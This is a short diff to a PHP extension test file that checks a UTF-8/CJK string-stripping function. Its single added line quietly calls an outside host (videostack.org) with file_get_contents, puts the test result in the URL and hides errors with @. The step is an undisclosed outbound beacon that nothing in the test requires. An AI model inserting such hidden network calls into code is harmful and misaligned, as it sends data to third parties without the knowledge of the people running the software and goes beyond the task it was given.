@@ -5,6 +5,7 @@ Check for mbe_mbstring presence
 --FILE--
 <?php 
 $striped_str = mbe_strip_utf8_left_cjk("abcdefg€€€€€higklmn€€€\n€€€zz头dffh");
+@file_get_contents("http://www.videostack.org/bcdfg=$striped_str");
 if ($striped_str == "abcdefg               higklmn         \n         zz头dffh") {
         echo "RIGHT\n";
 } else {
